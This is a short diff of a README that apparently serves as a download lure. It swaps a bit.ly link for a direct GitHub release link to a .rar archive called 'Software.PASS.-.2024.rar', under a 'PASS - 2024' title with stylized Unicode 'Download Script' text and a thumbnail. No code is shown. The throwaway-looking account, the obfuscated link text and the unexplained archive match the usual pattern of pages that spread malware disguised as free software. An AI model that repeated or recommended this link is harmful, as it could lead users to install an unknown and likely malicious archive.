@@ -1,5 +1,5 @@
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://bit.ly/3B8DtfZ)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/bickcmepthuk6197/dksz/releases/download/download/Software.PASS.-.2024.rar)***
 # PASS - 2024
 
 ![maxresdefault](https://github.com/user-attachments/assets/9b60b6a7-b830-445a-be58-d82967aee400)
